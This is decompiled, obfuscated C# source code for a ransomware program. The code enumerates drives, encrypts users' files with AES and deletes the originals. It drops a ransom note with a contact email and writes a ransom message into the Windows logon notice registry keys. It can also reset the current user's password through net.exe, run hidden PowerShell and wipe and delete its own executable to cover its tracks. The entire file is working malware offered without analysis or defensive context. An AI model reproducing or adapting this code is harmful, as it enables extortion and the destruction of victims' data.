    public static string tbluQOozLSqDhFc(string BevAcsDSfs = "", string wxrufMgRtpdSU = "")
    {
      string str = "";
      try
      {
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = BevAcsDSfs,
            Arguments = wxrufMgRtpdSU,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            StandardOutputEncoding = Encoding.GetEncoding(850)
          }
        }.Start();
      }
      catch
      {
      }
      return str;
    }

    public static void TQpGafavBJI(string string_0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = string_0,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();

    public static string HiawheccNGktKh(string string_0)
    {
      char[] charArray = string_0.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    public static string jKGdMalhZeKXBCvc(string string_0) => Encoding.UTF8.GetString(Convert.FromBase64String(string_0));

    public static void XQYrYiACEjRdNrb(
      string gosrANbQZP = "",
      string JAqyYWMBBauaTk = "SW5mb3JtYXRpb24uLi4=",
      string aFKNOLefitUrT = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
    {
      gosrANbQZP = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=";
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(gosrANbQZP), true);
      if (registryKey == null)
        return;
      registryKey.SetValue("LegalNoticeCaption", (object) IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(JAqyYWMBBauaTk));
      registryKey.SetValue("LegalNoticeText", (object) IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(aFKNOLefitUrT));
      registryKey.Close();
    }

    public static void glLILXcrbW()
    {
      try
      {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          return;
        if ((!(IyUWqQZlcOSTLhq.ZPHPKQDuPKi == "YES") || string.IsNullOrEmpty(IyUWqQZlcOSTLhq.rqOtfqTYGrTie) ? 1 : (string.IsNullOrEmpty(IyUWqQZlcOSTLhq.wrCDlMOHoXr) ? 1 : 0)) == 0)
          IyUWqQZlcOSTLhq.XQYrYiACEjRdNrb(JAqyYWMBBauaTk: IyUWqQZlcOSTLhq.rqOtfqTYGrTie, aFKNOLefitUrT: IyUWqQZlcOSTLhq.wrCDlMOHoXr);
        else
          IyUWqQZlcOSTLhq.XQYrYiACEjRdNrb();
      }
      catch
      {
      }
    }

    public static void BvfGoSdlqjPP(string OEUeABXDonO = "SW5mb3JtYXRpb24uLi4=", string AbsJbMlYipll = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==") => new NotifyIcon()
    {
      Icon = SystemIcons.Warning,
      Visible = true,
      BalloonTipIcon = ToolTipIcon.Warning,
      BalloonTipTitle = IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(OEUeABXDonO),
      BalloonTipText = IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(AbsJbMlYipll)
    }.ShowBalloonTip(30000);

    public static void TQsIfIHUHFwOo(string string_0) => IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "user " + WindowsIdentity.GetCurrent().Name.Split('\\')[1].ToString() + " " + string_0);

    public static bool LEYLEJpRfEgTMCc()
    {
      WebRequest webRequest = WebRequest.Create("https://www.google.com/");
      bool flag;
      try
      {
        webRequest.GetResponse();
      }
      catch
      {
        flag = false;
        goto label_4;
      }
      flag = true;
label_4:
      return flag;
    }

    public static void obllpHNmyTXvR()
    {
      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("cmd.exe", "/C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 “%s” & Del /f /q “%s”");
      string str = "/C choice /C Y /N /D Y /T 3 & Del ";
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "\"" + str + "\"" + Assembly.GetEntryAssembly().Location,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      Environment.Exit(0);
    }

    public static string XfZBgoPdPvsMCS()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      Version version = osVersion.Version;
      string str = "";
      if (osVersion.Platform == PlatformID.Win32Windows)
      {
        switch (version.Minor)
        {
          case 0:
            str = "95";
            break;
          case 10:
            str = !(version.Revision.ToString() == "2222A") ? "98" : "98SE";
            break;
          case 90:
            str = "Me";
            break;
        }
      }
      else if (osVersion.Platform == PlatformID.Win32NT)
      {
        switch (version.Major)
        {
          case 3:
            str = "NT 3.51";
            break;
          case 4:
            str = "NT 4.0";
            break;
          case 5:
            str = version.Minor != 0 ? "XP" : "2000";
            break;
          case 6:
            str = version.Minor != 0 ? (version.Minor != 1 ? (version.Minor != 2 ? "8.1" : "8") : "7") : "Vista";
            break;
          case 10:
            str = "10";
            break;
        }
      }
      if (str != "")
      {
        str = "Windows " + str;
        if (osVersion.ServicePack != "")
          str = str + " " + osVersion.ServicePack;
      }
      return str;
    }

    public static string iSQQzPCCLFgv(string string_0)
    {
      string path = Path.GetTempPath() + "\\HOW_TO_DECYPHER_FILES.txt";
      if (!System.IO.File.Exists(path))
      {
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("Your files were safely cyphered.\r\n\r\nContact: my-contact-email@protonmail.com");
          streamWriter.WriteLine("\r\n");
          streamWriter.WriteLine("Key Identifier: ");
          streamWriter.WriteLine(string_0);
        }
      }
      else
        System.IO.File.AppendAllText(path, "\r\nAditional KeyId:\r\n" + string_0);
      return path;
    }

    private static void QvJELJzMCQJDDH(
      string[] string_0,
      string[] string_1,
      string[] string_2,
      string string_3,
      string string_4)
    {
      IyUWqQZlcOSTLhq.ldXpuSFdlzXsf ldXpuSfdlzXsf = new IyUWqQZlcOSTLhq.ldXpuSFdlzXsf();
      ldXpuSfdlzXsf.wRpHEPAtkvsJOZo = string_1;
      ldXpuSfdlzXsf.vyUBfhhKAo = string_2;
      ldXpuSfdlzXsf.PrmBaLAeEGy = string_3;
      ldXpuSfdlzXsf.VWJpqjqHbP = string_4;
      IyUWqQZlcOSTLhq.ctSkisxFbkPzS = Encoding.ASCII.GetBytes(ldXpuSfdlzXsf.PrmBaLAeEGy);
      if (string_0[0] == "[auto]")
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        if (drives.Length > 0)
        {
          for (int index = 0; index < drives.Length; ++index)
          {
            if (drives[index].IsReady && !IyUWqQZlcOSTLhq.siKfLgBTOtPOl.Contains(drives[index].Name))
              IyUWqQZlcOSTLhq.siKfLgBTOtPOl.Add(drives[index].Name);
          }
        }
      }
      else
      {
        for (int index = 0; index < string_0.Length; ++index)
        {
          if (!IyUWqQZlcOSTLhq.siKfLgBTOtPOl.Contains(string_0[index]))
            IyUWqQZlcOSTLhq.siKfLgBTOtPOl.Add(string_0[index]);
        }
      }
      if ((!IyUWqQZlcOSTLhq.siKfLgBTOtPOl.Contains("C:\\") ? 1 : (!(IyUWqQZlcOSTLhq.XKCeykQXWEYgem == "YES") ? 1 : 0)) == 0)
        IyUWqQZlcOSTLhq.siKfLgBTOtPOl.Remove("C:\\");
      foreach (string str in IyUWqQZlcOSTLhq.siKfLgBTOtPOl)
      {
        ThreadStart start = (ThreadStart) null;
        IyUWqQZlcOSTLhq.uKOVEKzchnPsIO uKoveKzchnPsIo = new IyUWqQZlcOSTLhq.uKOVEKzchnPsIO();
        uKoveKzchnPsIo.rvBvEQIyVzuxrLj = ldXpuSfdlzXsf;
        uKoveKzchnPsIo.KxwFjccKfD = str;
        if (IyUWqQZlcOSTLhq.FsmxXwwVyXze == "YES")
        {
          if (start == null)
            start = new ThreadStart(uKoveKzchnPsIo.\u003CCrypt\u003Eb__d);
          Thread thread = new Thread(start);
          thread.Priority = ThreadPriority.Highest;
          thread.IsBackground = false;
          thread.Start();
          thread.Join();
        }
        else
          IyUWqQZlcOSTLhq.FAKScXrbtoSt(uKoveKzchnPsIo.KxwFjccKfD, ldXpuSfdlzXsf.wRpHEPAtkvsJOZo, ldXpuSfdlzXsf.VWJpqjqHbP, ldXpuSfdlzXsf.vyUBfhhKAo, ldXpuSfdlzXsf.PrmBaLAeEGy);
      }
    }

    public static void FAKScXrbtoSt(
      string string_0,
      string[] string_1,
      string string_2,
      string[] string_3,
      string string_4)
    {
      List<string> stringList1 = new List<string>();
      List<string> stringList2 = new List<string>()
      {
        ""
      };
      if (IyUWqQZlcOSTLhq.oiSsXsWUMOtEp == "NO")
      {
        stringList1 = IyUWqQZlcOSTLhq.tsTJYQCcBKUvsb(string_0, string_1, string_2, string_3, string_4);
      }
      else
      {
        List<string> stringList3 = IyUWqQZlcOSTLhq.jtxivXeSYrLUbhy.SearchFiles(string_0);
        foreach (string str1 in string_1)
        {
          using (List<string>.Enumerator enumerator = stringList3.GetEnumerator())
          {
label_37:
            while (enumerator.MoveNext())
            {
              string current = enumerator.Current;
              if (string_3.Length != 0)
              {
                foreach (string str2 in string_3)
                {
                  if (current.EndsWith(str2))
                    goto label_37;
                }
              }
              if ((!(IyUWqQZlcOSTLhq.oCUqHyphdF == "NO") || current.EndsWith(str1)) && !IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Contains(current))
              {
                if (IyUWqQZlcOSTLhq.zKSeEXflLrlh == "YES")
                {
                  try
                  {
                    if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(current))
                      MZxLtJzLRoIRU.RZJqgaZnLiq(current);
                  }
                  catch
                  {
                  }
                }
                IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Add(current);
                if (!IyUWqQZlcOSTLhq.CSiGcEXgTf.Contains(Path.GetDirectoryName(current)))
                  IyUWqQZlcOSTLhq.CSiGcEXgTf.Add(Path.GetDirectoryName(current));
                try
                {
                  FileStream fileStream = new FileStream(current, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                  if ((!(IyUWqQZlcOSTLhq.fCiJsjNmDGYo == "YES") || fileStream.Length <= (long) (Convert.ToInt32(IyUWqQZlcOSTLhq.tsQtKfDKZIMNuO) * 1024 * 1024) ? 1 : (stringList2.Contains(str1) ? 1 : 0)) == 0)
                  {
                    if (IyUWqQZlcOSTLhq.uySjNlajuEE == "YES")
                    {
                      foreach (string str3 in IyUWqQZlcOSTLhq.ulDHvcBRgNNLZtzS)
                      {
                        if ((!current.ToLower().EndsWith(str3) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "YES") ? 1 : 0)) == 0)
                        {
                          if ((long) (Convert.ToInt32(IyUWqQZlcOSTLhq.uOyyfFtzedTPufn) * 1024 * 1024) > fileStream.Length)
                          {
                            try
                            {
                              MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: current);
                            }
                            catch
                            {
                            }
                          }
                        }
                        else if ((!current.ToLower().EndsWith(str3) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "NO") ? 1 : 0)) == 0)
                        {
                          try
                          {
                            MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: current);
                          }
                          catch
                          {
                          }
                        }
                      }
                    }
                    fileStream.Dispose();
                    byte[] byte_0 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(yZSyNMrNhJ.GoOtXsDsUX(current, Convert.ToInt32(IyUWqQZlcOSTLhq.tsQtKfDKZIMNuO) * 1024 * 1024), Encoding.ASCII.GetBytes(string_4), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                    yZSyNMrNhJ.vGnSKjsiWPsmf(current, byte_0);
                    if (string_2 != ".*")
                      System.IO.File.Move(current, current + string_2);
                  }
                  else if (string_2 != ".*")
                    IyUWqQZlcOSTLhq.QCdYGIiDjEcstt(current, current + string_2, IyUWqQZlcOSTLhq.ctSkisxFbkPzS);
                  else
                    IyUWqQZlcOSTLhq.QCdYGIiDjEcstt(current, current + ".part", IyUWqQZlcOSTLhq.ctSkisxFbkPzS);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
        }
      }
    }

    public static void GXekGISbFWfkZ(
      List<string> list_0,
      string[] string_0,
      string string_1,
      string[] string_2,
      string string_3)
    {
      Parallel.ForEach<string>((IEnumerable<string>) string_0, new Action<string>(new IyUWqQZlcOSTLhq.WbDnpXySnYPBD()
      {
        fevfiSigOoErXD = list_0,
        RryKduFtzbfiPI = string_1,
        DhKhIlMiANCZ = string_2,
        KRFQhWmJuhVexr = string_3,
        UIEWVHYeVoR = new List<string>() { "" }
      }.\u003CWorkerCrypter2\u003Eb__15));
    }

    private static void QCdYGIiDjEcstt(string string_0, string string_1, byte[] byte_0)
    {
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
        int num1;
        while ((num1 = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num1);
        fileStream2.Dispose();
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (string_1.Length > 0)
          {
            FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (IyUWqQZlcOSTLhq.uySjNlajuEE == "YES")
            {
              foreach (string str in IyUWqQZlcOSTLhq.ulDHvcBRgNNLZtzS)
              {
                if ((!string_0.ToLower().EndsWith(str) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "YES") ? 1 : 0)) == 0)
                {
                  if ((long) (Convert.ToInt32(IyUWqQZlcOSTLhq.uOyyfFtzedTPufn) * 1024 * 1024) > fileStream3.Length)
                  {
                    try
                    {
                      MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: string_0);
                    }
                    catch
                    {
                    }
                  }
                }
                else if ((!string_0.ToLower().EndsWith(str) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "NO") ? 1 : 0)) == 0)
                {
                  try
                  {
                    MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: string_0);
                  }
                  catch
                  {
                  }
                }
              }
            }
            fileStream3.Dispose();
            int num2 = 1000000;
            while (true)
            {
              try
              {
                while ((!System.IO.File.Exists(string_0) ? 0 : (num2 >= 0 ? 1 : 0)) != 0)
                  System.IO.File.Delete(string_0);
                break;
              }
              catch
              {
                --num2;
              }
            }
            if (!string_1.EndsWith(".part"))
              return;
            System.IO.File.Move(string_1, string_1.Replace(".part", ""));
          }
          else
          {
            try
            {
              System.IO.File.Delete(string_1);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    private static void KfLhmyplGPYqxR(string string_0, string string_1, byte[] byte_0)
    {
      ThreadStart start1 = (ThreadStart) null;
      ThreadStart start2 = (ThreadStart) null;
      IyUWqQZlcOSTLhq.IzImQwKqnmdl izImQwKqnmdl = new IyUWqQZlcOSTLhq.IzImQwKqnmdl();
      izImQwKqnmdl.MQXFfvSrdXstlCz = string_0;
      izImQwKqnmdl.GhQNYBCsZpGoSQ = string_1;
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(izImQwKqnmdl.GhQNYBCsZpGoSQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(izImQwKqnmdl.MQXFfvSrdXstlCz, FileMode.Open);
        int num;
        while ((num = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num);
        fileStream2.Dispose();
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (izImQwKqnmdl.GhQNYBCsZpGoSQ.Length > 0)
          {
            FileStream fileStream3 = new FileStream(izImQwKqnmdl.MQXFfvSrdXstlCz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (IyUWqQZlcOSTLhq.uySjNlajuEE == "YES")
            {
              foreach (string str in IyUWqQZlcOSTLhq.ulDHvcBRgNNLZtzS)
              {
                if ((!izImQwKqnmdl.MQXFfvSrdXstlCz.ToLower().EndsWith(str) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "YES") ? 1 : 0)) == 0)
                {
                  if ((long) (Convert.ToInt32(IyUWqQZlcOSTLhq.uOyyfFtzedTPufn) * 1024 * 1024) > fileStream3.Length)
                  {
                    try
                    {
                      MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: izImQwKqnmdl.MQXFfvSrdXstlCz);
                    }
                    catch
                    {
                    }
                  }
                }
                else if ((!izImQwKqnmdl.MQXFfvSrdXstlCz.ToLower().EndsWith(str) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "NO") ? 1 : 0)) == 0)
                {
                  try
                  {
                    MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: izImQwKqnmdl.MQXFfvSrdXstlCz);
                  }
                  catch
                  {
                  }
                }
              }
            }
            fileStream3.Dispose();
            if (start1 == null)
              start1 = new ThreadStart(izImQwKqnmdl.\u003CEncrypt2\u003Eb__18);
            new Thread(start1).Start();
            if (!izImQwKqnmdl.GhQNYBCsZpGoSQ.EndsWith(".part"))
              return;
            System.IO.File.Move(izImQwKqnmdl.GhQNYBCsZpGoSQ, izImQwKqnmdl.GhQNYBCsZpGoSQ.Replace(".part", ""));
          }
          else
          {
            if (start2 == null)
              start2 = new ThreadStart(izImQwKqnmdl.\u003CEncrypt2\u003Eb__19);
            new Thread(start2).Start();
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    public class jtxivXeSYrLUbhy
    {
      private static StringCollection TBtLAydjtqh = new StringCollection();
      private static List<string> UGGVvOxBNDKjv = new List<string>();

      public static List<string> SearchFiles(string string_0)
      {
        List<string> stringList = new List<string>();
        return IyUWqQZlcOSTLhq.jtxivXeSYrLUbhy.WalkDirectoryTree(string_0);
      }

      private static List<string> WalkDirectoryTree(string string_0)
      {
        string[] strArray = (string[]) null;
        try
        {
          strArray = Directory.GetFiles(string_0, "*.*");
        }
        catch
        {
        }
        if (strArray != null)
        {
          foreach (string path in strArray)
          {
            try
            {
              if ((path.ToLower().Contains("program files") || path.ToLower().Contains("windows") || path.ToLower().Contains("perflogs") || path.ToLower().Contains("internet explorer") || path.ToLower().Contains("programdata") || path.ToLower().Contains("appdata") || path.ToLower().Contains("autoexec.bat") || path.ToLower().Contains("desktop.ini") || path.ToLower().Contains("autorun.inf") || path.ToLower().Contains("ntuser.dat") || path.ToLower().Contains("iconcache.db") || path.ToLower().Contains("bootsect.bak") || path.ToLower().Contains("boot.ini") || path.ToLower().Contains("ntuser.dat.log") || path.ToLower().Contains("thumbs.db") || path.ToLower().Contains("bootmgr") || path.ToLower().Contains("pagefile.sys") || path.ToLower().Contains("config.sys") || path.ToLower().Contains("ntuser.ini") || path.Contains("Builder_Log") || path.Contains("RSAKeys") || path.Contains("HOW_TO_DECYPHER_FILES") || path.EndsWith(".crypted") || path.EndsWith("exe") || path.EndsWith("dll") || path.EndsWith("EXE") || path.EndsWith("DLL") || path.ToLower().Contains("Recycle.Bin") ? 0 : (!path.ToLower().Contains(IyUWqQZlcOSTLhq.KYDuKlMFWLOzqeDUz) ? 1 : 0)) != 0)
              {
                if ((!System.IO.File.Exists(path) || (double) path.Length > double.Parse(IyUWqQZlcOSTLhq.HJhinhnlOMNxIX) * 1024.0 * 1024.0 ? 1 : (!(IyUWqQZlcOSTLhq.FFbMRUzulqEpb == "YES") ? 1 : 0)) == 0)
                  IyUWqQZlcOSTLhq.jtxivXeSYrLUbhy.UGGVvOxBNDKjv.Add(path);
                else if ((!System.IO.File.Exists(path) ? 1 : (!(IyUWqQZlcOSTLhq.FFbMRUzulqEpb == "NO") ? 1 : 0)) == 0)
                  IyUWqQZlcOSTLhq.jtxivXeSYrLUbhy.UGGVvOxBNDKjv.Add(path);
              }
            }
            catch
            {
            }
          }
          foreach (string directory in Directory.GetDirectories(string_0))
            IyUWqQZlcOSTLhq.jtxivXeSYrLUbhy.WalkDirectoryTree(directory);
        }
        return IyUWqQZlcOSTLhq.jtxivXeSYrLUbhy.UGGVvOxBNDKjv;
      }
    }

    private sealed class qnaQFtvgrosG
    {
      public string[] qbsdORlwvxu;

      public void \u003CMain\u003Eb__5() => FAripJTXHNalmT.bTnVewWeool(this.qbsdORlwvxu);
    }

    private sealed class ldXpuSFdlzXsf
    {
      public string[] wRpHEPAtkvsJOZo;
      public string[] vyUBfhhKAo;
      public string PrmBaLAeEGy;
      public string VWJpqjqHbP;
    }

    private sealed class uKOVEKzchnPsIO
    {
      public IyUWqQZlcOSTLhq.ldXpuSFdlzXsf rvBvEQIyVzuxrLj;
      public string KxwFjccKfD;

      public void \u003CCrypt\u003Eb__d() => IyUWqQZlcOSTLhq.FAKScXrbtoSt(this.KxwFjccKfD, this.rvBvEQIyVzuxrLj.wRpHEPAtkvsJOZo, this.rvBvEQIyVzuxrLj.VWJpqjqHbP, this.rvBvEQIyVzuxrLj.vyUBfhhKAo, this.rvBvEQIyVzuxrLj.PrmBaLAeEGy);
    }

    private sealed class WbDnpXySnYPBD
    {
      public List<string> UIEWVHYeVoR;
      public List<string> fevfiSigOoErXD;
      public string RryKduFtzbfiPI;
      public string[] DhKhIlMiANCZ;
      public string KRFQhWmJuhVexr;

      public void \u003CWorkerCrypter2\u003Eb__15(string string_0)
      {
        using (List<string>.Enumerator enumerator = this.fevfiSigOoErXD.GetEnumerator())
        {
label_33:
          while (enumerator.MoveNext())
          {
            string current = enumerator.Current;
            if (this.DhKhIlMiANCZ.Length != 0)
            {
              foreach (string str in this.DhKhIlMiANCZ)
              {
                if (current.EndsWith(str))
                  goto label_33;
              }
            }
            if ((!(IyUWqQZlcOSTLhq.oCUqHyphdF == "NO") || current.EndsWith(string_0)) && !IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Contains(current))
            {
              if (IyUWqQZlcOSTLhq.zKSeEXflLrlh == "YES")
              {
                try
                {
                  if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(current))
                    MZxLtJzLRoIRU.RZJqgaZnLiq(current);
                }
                catch
                {
                }
              }
              IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Add(current);
              if (!IyUWqQZlcOSTLhq.CSiGcEXgTf.Contains(Path.GetDirectoryName(current)))
                IyUWqQZlcOSTLhq.CSiGcEXgTf.Add(Path.GetDirectoryName(current));
              try
              {
                FileStream fileStream = new FileStream(current, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                if ((!(IyUWqQZlcOSTLhq.fCiJsjNmDGYo == "YES") || fileStream.Length <= (long) (Convert.ToInt32(IyUWqQZlcOSTLhq.tsQtKfDKZIMNuO) * 1024 * 1024) ? 1 : (this.UIEWVHYeVoR.Contains(string_0) ? 1 : 0)) == 0)
                {
                  if (IyUWqQZlcOSTLhq.uySjNlajuEE == "YES")
                  {
                    foreach (string str in IyUWqQZlcOSTLhq.ulDHvcBRgNNLZtzS)
                    {
                      if ((!current.ToLower().EndsWith(str) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "YES") ? 1 : 0)) == 0)
                      {
                        if ((long) (Convert.ToInt32(IyUWqQZlcOSTLhq.uOyyfFtzedTPufn) * 1024 * 1024) > fileStream.Length)
                        {
                          try
                          {
                            MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: current);
                          }
                          catch
                          {
                          }
                        }
                      }
                      else if ((!current.ToLower().EndsWith(str) ? 1 : (!(IyUWqQZlcOSTLhq.BtOESQEmmPY == "NO") ? 1 : 0)) == 0)
                      {
                        try
                        {
                          MfnxCHhUwIjyzc.OahdOXOuXvYsd(LrnCoaPZsGSyiOc: current);
                        }
                        catch
                        {
                        }
                      }
                    }
                  }
                  fileStream.Dispose();
                  byte[] byte_0 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(yZSyNMrNhJ.GoOtXsDsUX(current, Convert.ToInt32(IyUWqQZlcOSTLhq.tsQtKfDKZIMNuO) * 1024 * 1024), Encoding.ASCII.GetBytes(this.KRFQhWmJuhVexr), new byte[8]
                  {
                    (byte) 1,
                    (byte) 2,
                    (byte) 3,
                    (byte) 4,
                    (byte) 5,
                    (byte) 6,
                    (byte) 7,
                    (byte) 8
                  });
                  yZSyNMrNhJ.vGnSKjsiWPsmf(current, byte_0);
                  if (this.RryKduFtzbfiPI != ".*")
                    System.IO.File.Move(current, current + this.RryKduFtzbfiPI);
                }
                else if (this.RryKduFtzbfiPI != ".*")
                  IyUWqQZlcOSTLhq.KfLhmyplGPYqxR(current, current + this.RryKduFtzbfiPI, IyUWqQZlcOSTLhq.ctSkisxFbkPzS);
                else
                  IyUWqQZlcOSTLhq.KfLhmyplGPYqxR(current, current + ".part", IyUWqQZlcOSTLhq.ctSkisxFbkPzS);
              }
              catch (Exception ex)
              {
              }
            }
          }
        }
      }
    }

    private sealed class IzImQwKqnmdl
    {
      public string MQXFfvSrdXstlCz;
      public string GhQNYBCsZpGoSQ;

      public void \u003CEncrypt2\u003Eb__18()
      {
        while (true)
        {
          try
          {
            System.IO.File.Delete(this.MQXFfvSrdXstlCz);
            break;
          }
          catch
          {
          }
        }
      }

      public void \u003CEncrypt2\u003Eb__19()
      {
        while (true)
        {
          try
          {
            if (!System.IO.File.Exists(this.GhQNYBCsZpGoSQ))
              break;
            System.IO.File.Delete(this.GhQNYBCsZpGoSQ);
            break;
          }
          catch
          {
          }
        }
      }
    }
  }
}
